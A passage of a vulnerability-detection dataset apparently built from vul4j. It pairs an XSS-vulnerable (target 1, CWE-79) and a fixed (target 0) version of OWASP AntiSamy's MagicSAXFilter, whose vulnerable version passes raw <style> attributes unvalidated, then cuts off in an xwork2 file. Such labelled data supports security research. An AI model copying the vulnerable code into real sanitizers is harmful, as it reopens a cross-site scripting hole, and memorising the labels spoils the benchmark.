XMLAttributesImpl();\n\t\t\t\t\t// attributes.addAttribute(makeSimpleQname(\"type\"), \"CDATA\",\n\t\t\t\t\t// \"text/css\");\n\t\t\t\t\t// start the CSS element\n\n\t\t\t\t\tsuper.startElement(element, cssAttributes, new AugmentationsImpl());\n\t\t\t\t\t// send the cleaned content\n\t\t\t\t\tsuper.characters(new XMLStringBuffer(results.getCleanHTML()), new AugmentationsImpl());\n\t\t\t\t\t// end the CSS element\n\t\t\t\t\tsuper.endElement(element, augs);\n\t\t\t\t}\n\t\t\t} catch (ScanException e) {\n\t\t\t\t// if the CSS is unscannable, we report the error, but skip the\n\t\t\t\t// style element\n\t\t\t\taddError(ErrorMessageUtil.ERROR_CSS_TAG_MALFORMED, new Object[] {\n\t\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(cssContent.toString())\n\t\t\t\t});\n\t\t\t} finally {\n\t\t\t\t// reset the string buffer to allow fresh recording of next\n\t\t\t\t// style tag\n\t\t\t\tcssContent = null;\n\t\t\t\tcssAttributes = null;\n\t\t\t}\n\t\t} else {\n\t\t\t// keep or truncate means the end-tag stays intact\n\t\t\toperations.pop();\n\t\t\tsuper.endElement(element, augs);\n\t\t}\n\t}\n\n\tprivate CssScanner makeCssScanner() {\n\t\tif (cssScanner == null) {\n            cssScanner = externalCssScanner ? new ExternalCssScanner(policy, messages) : new CssScanner(policy, messages);\n\t\t}\n\t\treturn cssScanner;\n\t}\n\n\tpublic void processingInstruction(String target, XMLString data, Augmentations augs) throws XNIException {\n\t\t// processing instructions are being removed\n\t}\n\t\n\tpublic void startCDATA(Augmentations augs) throws XNIException {\n\t\tinCdata = true;\n\t\tsuper.startCDATA(augs);\n\t}\n\t\n\tpublic void endCDATA(Augmentations augs) throws XNIException {\n\t\tinCdata = false;\n\t\tsuper.endCDATA(augs);\n\t}\n\n\tpublic void startElement(QName element, XMLAttributes attributes, Augmentations augs) throws XNIException {\n\t\t// see if we have a policy for this tag.\n        String tagNameLowerCase = element.localpart.toLowerCase();\n        Tag tag = policy.getTagByLowercaseName(tagNameLowerCase);\n\n\t\t/*\n\t\t * Handle the automatic translation of <param> to nested <embed> for IE.\n\t\t * This is only if the \"validateParamAsEmbed\" directive is enabled.\n\t\t */\n\t\tboolean masqueradingParam = false;\n\t\tString embedName = null;\n\t\tString embedValue = null;\n\t\tif (tag == null && isValidateParamAsEmbed && \"param\".equals(tagNameLowerCase)) {\n\t\t\tTag embedPolicy = policy.getEmbedTag();\n\t\t\tif (embedPolicy != null && embedPolicy.isAction( Policy.ACTION_VALIDATE)) {\n\t\t\t\ttag = embedPolicy;// Constants.BASIC_PARAM_TAG_RULE;\n\t\t\t\tmasqueradingParam = true;\n\t\t\t\t// take <param name=x value=y> and turn into\n\t\t\t\t// <embed x=y></embed>\n\t\t\t\tembedName = attributes.getValue(\"name\");\n\t\t\t\tembedValue = attributes.getValue(\"value\");\n\t\t\t\tXMLAttributes masqueradingAttrs = new XMLAttributesImpl();\n\t\t\t\tmasqueradingAttrs.addAttribute(makeSimpleQname(embedName), \"CDATA\", embedValue);\n\t\t\t\tattributes = masqueradingAttrs;\n\t\t\t}\n\t\t}\n\n\t\tXMLAttributes validattributes = new XMLAttributesImpl();\n        Ops topOp = peekTop();\n        if (Ops.REMOVE == topOp || Ops.CSS == topOp) {\n\t\t\t// we are in removal-mode, so remove this tag as well\n\t\t\t// we also remove all child elements of a style element\n\t\t\tthis.operations.push( Ops.REMOVE);\n\t\t} else if ((tag == null && policy.isEncodeUnknownTag()) || (tag != null && tag.isAction( \"encode\" ))) {\n\t\t\tString name = \"<\" + element.localpart + \">\";\n\t\t\tsuper.characters( new XMLString( name.toCharArray(), 0, name.length() ), augs );\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag == null) {\n\t\t\taddError( ErrorMessageUtil.ERROR_TAG_NOT_IN_POLICY,\n                      new Object[]{ HTMLEntityEncoder.htmlEntityEncode( element.localpart ) } );\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag.isAction( \"filter\")) {\n\t\t\taddError(ErrorMessageUtil.ERROR_TAG_FILTERED, new Object[] {\n\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(element.localpart)\n\t\t\t});\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag.isAction( \"validate\")) {\n\n\t\t\tboolean isStyle = \"style\".endsWith(element.localpart);\n\n\t\t\tif (isStyle) {\n\t\t\t\tthis.operations.push(Ops.CSS);\n\t\t\t\tcssContent = new StringBuffer();\n\t\t\t\tcssAttributes = attributes;\n\t\t\t} else {\n\t\t\t\t// validate all attributes, we need to do this now to find out\n\t\t\t\t// how to deal with the element\n\t\t\t\tboolean removeTag = false;\n\t\t\t\tboolean filterTag = false;\n\t\t\t\tfor (int i = 0; i < attributes.getLength(); i++) {\n\t\t\t\t\tString name = attributes.getQName(i);\n\t\t\t\t\tString value = attributes.getValue(i);\n\t\t\t\t\tString nameLower = name.toLowerCase();\n\t\t\t\t\tAttribute attribute = tag.getAttributeByName(nameLower);\n\t\t\t\t\tif (attribute == null) {\n\t\t\t\t\t\t// no policy defined, perhaps it is a global attribute\n\t\t\t\t\t\tattribute = policy.getGlobalAttributeByName(nameLower);\n\t\t\t\t\t}\n\t\t\t\t\t// boolean isAttributeValid = false;\n\t\t\t\t\tif (\"style\".equalsIgnoreCase(name)) {\n\t\t\t\t\t\tCssScanner styleScanner = makeCssScanner();\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tCleanResults cr = styleScanner.scanInlineStyle(value, element.localpart, maxInputSize);\n\t\t\t\t\t\t\tattributes.setValue(i, cr.getCleanHTML());\n\t\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(name), \"CDATA\", cr.getCleanHTML());\n\t\t\t\t\t\t\terrorMessages.addAll(cr.getErrorMessages());\n\t\t\t\t\t\t} catch (ScanException e) {\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_CSS_ATTRIBUTE_MALFORMED, new Object[] {\n\t\t\t\t\t\t\t\t\telement.localpart, HTMLEntityEncoder.htmlEntityEncode(value)\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t}\n\t\t\t\t\t} else if (attribute != null) {\n\t\t\t\t\t\t// validate the values against the policy\n\t\t\t\t\t\tboolean isValid = false;\n                        if (attribute.containsAllowedValue(value.toLowerCase())) {\n                            validattributes.addAttribute(makeSimpleQname(name), \"CDATA\", value);\n                            isValid = true;\n                        }\n\n\n                        if (!isValid) {\n                            isValid = attribute.matchesAllowedExpression(value);\n                            if (isValid) {\n                                validattributes.addAttribute(makeSimpleQname(name), \"CDATA\", value);\n                            }\n                        }\n\n\n                        // if value or regexp matched, attribute is already\n\t\t\t\t\t\t// copied, but what happens if not\n\t\t\t\t\t\tif (!isValid && \"removeTag\".equals(attribute.getOnInvalid())) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_INVALID_REMOVED,\n\t\t\t\t\t\t\t\tnew Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tremoveTag = true;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t} else if (!isValid && (\"filterTag\".equals(attribute.getOnInvalid()) || masqueradingParam)) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_CAUSE_FILTER, \n\t\t\t\t\t\t\t\tnew Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tfilterTag = true;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t} else if (!isValid) {\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_INVALID, new Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t} else { // attribute == null\n\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_NOT_IN_POLICY, new Object[] {\n\t\t\t\t\t\t\t\telement.localpart, HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value)\n\t\t\t\t\t\t});\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (masqueradingParam) {\n\t\t\t\t\t\t\tfilterTag = true;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (removeTag) {\n\t\t\t\t\tthis.operations.push(Ops.REMOVE);\n\t\t\t\t} else if (filterTag) {\n\t\t\t\t\tthis.operations.push(Ops.FILTER);\n\t\t\t\t} else {\n\n\t\t\t\t\tif (isNofollowAnchors && \"a\".equals(element.localpart)) {\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"rel\"), \"CDATA\", \"nofollow\");\n\t\t\t\t\t}\n\n\t\t\t\t\tif (masqueradingParam) {\n\t\t\t\t\t\tvalidattributes = new XMLAttributesImpl();\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"name\"), \"CDATA\", embedName);\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"value\"), \"CDATA\", embedValue);\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.operations.push(Ops.KEEP);\n\t\t\t\t}\n\t\t\t}\n\t\t} else if (tag.isAction( \"truncate\")) {\n\t\t\tthis.operations.push(Ops.TRUNCATE);\n\t\t} else {\n\t\t\t// no options left, so the tag will be removed\n\t\t\taddError(ErrorMessageUtil.ERROR_TAG_DISALLOWED, new Object[] {\n\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(element.localpart)\n\t\t\t});\n\t\t\tthis.operations.push(Ops.REMOVE);\n\t\t}\n\t\t// now we know exactly what to do, let's do it\n\t\tif ( Ops.TRUNCATE.equals( operations.peek() )) {\n\t\t\t// copy the element, but remove all attributes\n\t\t\tsuper.startElement(element, new XMLAttributesImpl(), augs);\n\t\t} else if ( Ops.KEEP.equals(operations.peek())) {\n\t\t\t// copy the element, but only copy accepted attributes\n\t\t\tsuper.startElement(element, validattributes, augs);\n\t\t}\n\t}\n\n\tprivate QName makeSimpleQname(String name) {\n\t\treturn new QName(\"\", name, name, \"\");\n\t}\n\n\tprivate void addError(String errorKey, Object[] objs) {\n\t\terrorMessages.add(ErrorMessageUtil.getMessage(messages, errorKey, objs));\n\t}\n\n\tpublic List<String> getErrorMessages() {\n\t\treturn errorMessages;\n\t}\n\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "vul4j",
    "idx": 200170,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright (c) 2007-2011, Arshan Dabirsiaghi, Jason Li\n * \n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n * \n * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n * Neither the name of OWASP nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\npackage org.owasp.validator.html.scan;\n\nimport java.util.*;\nimport java.util.regex.Pattern;\n\nimport org.apache.xerces.util.AugmentationsImpl;\nimport org.apache.xerces.util.XMLAttributesImpl;\nimport org.apache.xerces.util.XMLStringBuffer;\nimport org.apache.xerces.xni.Augmentations;\nimport org.apache.xerces.xni.QName;\nimport org.apache.xerces.xni.XMLAttributes;\nimport org.apache.xerces.xni.XMLString;\nimport org.apache.xerces.xni.XNIException;\nimport org.apache.xerces.xni.parser.XMLDocumentFilter;\nimport org.cyberneko.html.filters.DefaultFilter;\nimport org.owasp.validator.css.CssScanner;\nimport org.owasp.validator.css.ExternalCssScanner;\nimport org.owasp.validator.html.CleanResults;\nimport org.owasp.validator.html.InternalPolicy;\nimport org.owasp.validator.html.Policy;\nimport org.owasp.validator.html.ScanException;\nimport org.owasp.validator.html.model.Attribute;\nimport org.owasp.validator.html.model.Tag;\nimport org.owasp.validator.html.util.ErrorMessageUtil;\nimport org.owasp.validator.html.util.HTMLEntityEncoder;\n\n/**\n * Implementation of an HTML-filter that adheres to an AntiSamy policy. This\n * filter is SAX-based which means it is much more memory-efficient and also a\n * bit faster than the DOM-based implementation.\n */\npublic class MagicSAXFilter extends DefaultFilter implements XMLDocumentFilter {\n\n    private static enum Ops {\n        CSS, FILTER, REMOVE, TRUNCATE, KEEP\n    }\n\tprivate final Stack<Ops> operations = new Stack<Ops>();\n\tprivate List<String> errorMessages = new ArrayList<String>();\n\tprivate StringBuffer cssContent = null;\n\tprivate XMLAttributes cssAttributes = null;\n\tprivate CssScanner cssScanner = null;\n\tprivate InternalPolicy policy;\n\tprivate ResourceBundle messages;\n\n\tprivate boolean isNofollowAnchors;\n\tprivate boolean isValidateParamAsEmbed;\n\tprivate boolean inCdata = false;\n    // From policy\n    private boolean preserveComments;\n    private int maxInputSize;\n    private boolean externalCssScanner;\n\n    public MagicSAXFilter(ResourceBundle messages) {\n\t\tthis.messages = messages;\n    }\n\n    public void reset(InternalPolicy instance){\n        this.policy = instance;\n        isNofollowAnchors = policy.isNofollowAnchors();\n        isValidateParamAsEmbed = policy.isValidateParamAsEmbed();\n        preserveComments = policy.isPreserveComments();\n        maxInputSize = policy.getMaxInputSize();\n        externalCssScanner = policy.isEmbedStyleSheets();\n        operations.clear();\n        errorMessages.clear();\n        cssContent = null;\n        cssAttributes = null;\n        cssScanner = null;\n        inCdata = false;\n\n    }\n\n\tpublic void characters(XMLString text, Augmentations augs) throws XNIException {\n        //noinspection StatementWithEmptyBody\n        Ops topOp = peekTop();\n        //noinspection StatementWithEmptyBody\n        if (topOp ==  Ops.REMOVE) {\n\t\t\t// content is removed altogether\n\t\t} else if (topOp == Ops.CSS) {\n\t\t\t// we record the style element's text content\n\t\t\t// to filter it later\n\t\t\tcssContent.append(text.ch, text.offset, text.length);\n\t\t} else {\n\t\t\t// pass through all character content.\n\t\t\tif ( inCdata ) {\n\t\t\t\tString encoded = HTMLEntityEncoder.htmlEntityEncode(text.toString());\n                addError(ErrorMessageUtil.ERROR_CDATA_FOUND, new Object[]{encoded});\n\t\t\t}\n\t\t\tsuper.characters(text, augs);\n\t\t}\n\t}\n\n    private static final Pattern conditionalDirectives =\n            Pattern.compile(\"<?!?\\\\[\\\\s*(?:end)?if[^]]*\\\\]>?\");\n\n    public void comment(XMLString text, Augmentations augs) throws XNIException {\n\n\t\tif (preserveComments) {\n\t\t\tString value = text.toString();\n\t\t\t// Strip conditional directives regardless of the\n\t\t\t// PRESERVE_COMMENTS setting.\n\t\t\tif (value != null) {\n                value = conditionalDirectives.matcher(value).replaceAll(\"\");\n\t\t\t\tsuper.comment(new XMLString(value.toCharArray(), 0, value.length()), augs);\n\t\t\t}\n\t\t}\n\t}\n\n\tpublic void doctypeDecl(String root, String publicId, String systemId, Augmentations augs) throws XNIException {\n\t\t// user supplied doctypes are ignored\n\t}\n\n\tpublic void emptyElement(QName element, XMLAttributes attributes, Augmentations augs) throws XNIException {\n\t\tthis.startElement(element, attributes, augs);\n\t\tthis.endElement(element, augs);\n\t}\n\n    private Ops peekTop(){\n         return operations.empty() ? null : operations.peek();\n    }\n\n\tpublic void endElement(QName element, Augmentations augs) throws XNIException {\n        Ops topOp = peekTop();\n        if (Ops.REMOVE == topOp) {\n\t\t\t// content is removed altogether\n\t\t\toperations.pop();\n\t\t} else if (Ops.FILTER == topOp) {\n\t\t\t// content is removed, but child nodes not\n\t\t\toperations.pop();\n\t\t} else if (Ops.CSS == topOp) {\n\t\t\toperations.pop();\n\t\t\t// now scan the CSS.\n\t\t\tCssScanner cssScanner = makeCssScanner();\n\t\t\ttry {\n\t\t\t\tCleanResults results = cssScanner.scanStyleSheet(cssContent.toString(), maxInputSize);\n\t\t\t\t// report all errors found\n\t\t\t\terrorMessages.addAll(results.getErrorMessages());\n\t\t\t\t/*\n\t\t\t\t * If IE gets an empty style tag, i.e. <style/> it will break\n\t\t\t\t * all CSS on the page. I wish I was kidding. So, if after\n\t\t\t\t * validation no CSS properties are left, we would normally be\n\t\t\t\t * left with an empty style tag and break all CSS. To prevent\n\t\t\t\t * that, we have this check.\n\t\t\t\t */\n                //noinspection StatementWithEmptyBody\n                if (results.getCleanHTML() == null || results.getCleanHTML().equals(\"\")) {\n\t\t\t\t\t// we do not generate empty style elements\n\t\t\t\t} else {\n\t\t\t\t\t// XMLAttributes attributes = new XMLAttributesImpl();\n\t\t\t\t\t// attributes.addAttribute(makeSimpleQname(\"type\"), \"CDATA\",\n\t\t\t\t\t// \"text/css\");\n\t\t\t\t\t// start the CSS element\n\n\t\t\t\t\tsuper.startElement(element, cssAttributes, new AugmentationsImpl());\n\t\t\t\t\t// send the cleaned content\n\t\t\t\t\tsuper.characters(new XMLStringBuffer(results.getCleanHTML()), new AugmentationsImpl());\n\t\t\t\t\t// end the CSS element\n\t\t\t\t\tsuper.endElement(element, augs);\n\t\t\t\t}\n\t\t\t} catch (ScanException e) {\n\t\t\t\t// if the CSS is unscannable, we report the error, but skip the\n\t\t\t\t// style element\n\t\t\t\taddError(ErrorMessageUtil.ERROR_CSS_TAG_MALFORMED, new Object[] {\n\t\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(cssContent.toString())\n\t\t\t\t});\n\t\t\t} finally {\n\t\t\t\t// reset the string buffer to allow fresh recording of next\n\t\t\t\t// style tag\n\t\t\t\tcssContent = null;\n\t\t\t\tcssAttributes = null;\n\t\t\t}\n\t\t} else {\n\t\t\t// keep or truncate means the end-tag stays intact\n\t\t\toperations.pop();\n\t\t\tsuper.endElement(element, augs);\n\t\t}\n\t}\n\n\tprivate CssScanner makeCssScanner() {\n\t\tif (cssScanner == null) {\n            cssScanner = externalCssScanner ? new ExternalCssScanner(policy, messages) : new CssScanner(policy, messages);\n\t\t}\n\t\treturn cssScanner;\n\t}\n\n\tpublic void processingInstruction(String target, XMLString data, Augmentations augs) throws XNIException {\n\t\t// processing instructions are being removed\n\t}\n\t\n\tpublic void startCDATA(Augmentations augs) throws XNIException {\n\t\tinCdata = true;\n\t\tsuper.startCDATA(augs);\n\t}\n\t\n\tpublic void endCDATA(Augmentations augs) throws XNIException {\n\t\tinCdata = false;\n\t\tsuper.endCDATA(augs);\n\t}\n\n\tpublic void startElement(QName element, XMLAttributes attributes, Augmentations augs) throws XNIException {\n\t\t// see if we have a policy for this tag.\n        String tagNameLowerCase = element.localpart.toLowerCase();\n        Tag tag = policy.getTagByLowercaseName(tagNameLowerCase);\n\n\t\t/*\n\t\t * Handle the automatic translation of <param> to nested <embed> for IE.\n\t\t * This is only if the \"validateParamAsEmbed\" directive is enabled.\n\t\t */\n\t\tboolean masqueradingParam = false;\n\t\tString embedName = null;\n\t\tString embedValue = null;\n\t\tif (tag == null && isValidateParamAsEmbed && \"param\".equals(tagNameLowerCase)) {\n\t\t\tTag embedPolicy = policy.getEmbedTag();\n\t\t\tif (embedPolicy != null && embedPolicy.isAction( Policy.ACTION_VALIDATE)) {\n\t\t\t\ttag = embedPolicy;// Constants.BASIC_PARAM_TAG_RULE;\n\t\t\t\tmasqueradingParam = true;\n\t\t\t\t// take <param name=x value=y> and turn into\n\t\t\t\t// <embed x=y></embed>\n\t\t\t\tembedName = attributes.getValue(\"name\");\n\t\t\t\tembedValue = attributes.getValue(\"value\");\n\t\t\t\tXMLAttributes masqueradingAttrs = new XMLAttributesImpl();\n\t\t\t\tmasqueradingAttrs.addAttribute(makeSimpleQname(embedName), \"CDATA\", embedValue);\n\t\t\t\tattributes = masqueradingAttrs;\n\t\t\t}\n\t\t}\n\n\t\tXMLAttributes validattributes = new XMLAttributesImpl();\n        Ops topOp = peekTop();\n        if (Ops.REMOVE == topOp || Ops.CSS == topOp) {\n\t\t\t// we are in removal-mode, so remove this tag as well\n\t\t\t// we also remove all child elements of a style element\n\t\t\tthis.operations.push( Ops.REMOVE);\n\t\t} else if ((tag == null && policy.isEncodeUnknownTag()) || (tag != null && tag.isAction( \"encode\" ))) {\n\t\t\tString name = \"<\" + element.localpart + \">\";\n\t\t\tsuper.characters( new XMLString( name.toCharArray(), 0, name.length() ), augs );\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag == null) {\n\t\t\taddError( ErrorMessageUtil.ERROR_TAG_NOT_IN_POLICY,\n                      new Object[]{ HTMLEntityEncoder.htmlEntityEncode( element.localpart ) } );\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag.isAction( \"filter\")) {\n\t\t\taddError(ErrorMessageUtil.ERROR_TAG_FILTERED, new Object[] {\n\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(element.localpart)\n\t\t\t});\n\t\t\tthis.operations.push(Ops.FILTER);\n\t\t} else if (tag.isAction( \"validate\")) {\n\n\t\t\tboolean isStyle = \"style\".endsWith(element.localpart);\n\n\t\t\t\t// validate all attributes, we need to do this now to find out\n\t\t\t\t// how to deal with the element\n\t\t\t\tboolean removeTag = false;\n\t\t\t\tboolean filterTag = false;\n\t\t\t\tfor (int i = 0; i < attributes.getLength(); i++) {\n\t\t\t\t\tString name = attributes.getQName(i);\n\t\t\t\t\tString value = attributes.getValue(i);\n\t\t\t\t\tString nameLower = name.toLowerCase();\n\t\t\t\t\tAttribute attribute = tag.getAttributeByName(nameLower);\n\t\t\t\t\tif (attribute == null) {\n\t\t\t\t\t\t// no policy defined, perhaps it is a global attribute\n\t\t\t\t\t\tattribute = policy.getGlobalAttributeByName(nameLower);\n\t\t\t\t\t}\n\t\t\t\t\t// boolean isAttributeValid = false;\n\t\t\t\t\tif (\"style\".equalsIgnoreCase(name)) {\n\t\t\t\t\t\tCssScanner styleScanner = makeCssScanner();\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tCleanResults cr = styleScanner.scanInlineStyle(value, element.localpart, maxInputSize);\n\t\t\t\t\t\t\tattributes.setValue(i, cr.getCleanHTML());\n\t\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(name), \"CDATA\", cr.getCleanHTML());\n\t\t\t\t\t\t\terrorMessages.addAll(cr.getErrorMessages());\n\t\t\t\t\t\t} catch (ScanException e) {\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_CSS_ATTRIBUTE_MALFORMED, new Object[] {\n\t\t\t\t\t\t\t\t\telement.localpart, HTMLEntityEncoder.htmlEntityEncode(value)\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t}\n\t\t\t\t\t} else if (attribute != null) {\n\t\t\t\t\t\t// validate the values against the policy\n\t\t\t\t\t\tboolean isValid = false;\n                        if (attribute.containsAllowedValue(value.toLowerCase())) {\n                            validattributes.addAttribute(makeSimpleQname(name), \"CDATA\", value);\n                            isValid = true;\n                        }\n\n\n                        if (!isValid) {\n                            isValid = attribute.matchesAllowedExpression(value);\n                            if (isValid) {\n                                validattributes.addAttribute(makeSimpleQname(name), \"CDATA\", value);\n                            }\n                        }\n\n\n                        // if value or regexp matched, attribute is already\n\t\t\t\t\t\t// copied, but what happens if not\n\t\t\t\t\t\tif (!isValid && \"removeTag\".equals(attribute.getOnInvalid())) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_INVALID_REMOVED,\n\t\t\t\t\t\t\t\tnew Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tremoveTag = true;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t} else if (!isValid && (\"filterTag\".equals(attribute.getOnInvalid()) || masqueradingParam)) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_CAUSE_FILTER, \n\t\t\t\t\t\t\t\tnew Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tfilterTag = true;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t} else if (!isValid) {\n\t\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_INVALID, new Object[] { tag.getName(), HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value) });\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t} else { // attribute == null\n\t\t\t\t\t\taddError(ErrorMessageUtil.ERROR_ATTRIBUTE_NOT_IN_POLICY, new Object[] {\n\t\t\t\t\t\t\t\telement.localpart, HTMLEntityEncoder.htmlEntityEncode(name), HTMLEntityEncoder.htmlEntityEncode(value)\n\t\t\t\t\t\t});\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (masqueradingParam) {\n\t\t\t\t\t\t\tfilterTag = true;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (removeTag) {\n\t\t\t\t\tthis.operations.push(Ops.REMOVE);\n\t\t\t\t} else if (isStyle) {\n\t\t\t\t\tthis.operations.push(Ops.CSS);\n\t\t\t\t\tcssContent = new StringBuffer();\n\t\t\t\t\tcssAttributes = validattributes;\n\t\t\t\t} else if (filterTag) {\n\t\t\t\t\tthis.operations.push(Ops.FILTER);\n\t\t\t\t} else {\n\n\t\t\t\t\tif (isNofollowAnchors && \"a\".equals(element.localpart)) {\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"rel\"), \"CDATA\", \"nofollow\");\n\t\t\t\t\t}\n\n\t\t\t\t\tif (masqueradingParam) {\n\t\t\t\t\t\tvalidattributes = new XMLAttributesImpl();\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"name\"), \"CDATA\", embedName);\n\t\t\t\t\t\tvalidattributes.addAttribute(makeSimpleQname(\"value\"), \"CDATA\", embedValue);\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.operations.push(Ops.KEEP);\n\t\t\t\t}\n\t\t\t\n\t\t} else if (tag.isAction( \"truncate\")) {\n\t\t\tthis.operations.push(Ops.TRUNCATE);\n\t\t} else {\n\t\t\t// no options left, so the tag will be removed\n\t\t\taddError(ErrorMessageUtil.ERROR_TAG_DISALLOWED, new Object[] {\n\t\t\t\tHTMLEntityEncoder.htmlEntityEncode(element.localpart)\n\t\t\t});\n\t\t\tthis.operations.push(Ops.REMOVE);\n\t\t}\n\t\t// now we know exactly what to do, let's do it\n\t\tif ( Ops.TRUNCATE.equals( operations.peek() )) {\n\t\t\t// copy the element, but remove all attributes\n\t\t\tsuper.startElement(element, new XMLAttributesImpl(), augs);\n\t\t} else if ( Ops.KEEP.equals(operations.peek())) {\n\t\t\t// copy the element, but only copy accepted attributes\n\t\t\tsuper.startElement(element, validattributes, augs);\n\t\t}\n\t}\n\n\tprivate QName makeSimpleQname(String name) {\n\t\treturn new QName(\"\", name, name, \"\");\n\t}\n\n\tprivate void addError(String errorKey, Object[] objs) {\n\t\terrorMessages.add(ErrorMessageUtil.getMessage(messages, errorKey, objs));\n\t}\n\n\tpublic List<String> getErrorMessages() {\n\t\treturn errorMessages;\n\t}\n\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "vul4j",
    "idx": 200171,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright 2002-2006,2009 The Apache Software Foundation.\n * \n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * \n *      http://www.apache.org/licenses/LICENSE-2.0\n * \n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.opensymphony.xwork2;\n\nimport com.opensymphony.xwork2.config.Configuration;\nimport com.opensymphony.xwork2.config.ConfigurationException;\nimport com.opensymphony.xwork2.config.entities.ActionConfig;\nimport com.opensymphony.xwork2.inject.Inject;\nimport com.opensymphony.xwork2.util.LocalizedTextUtil;\nimport 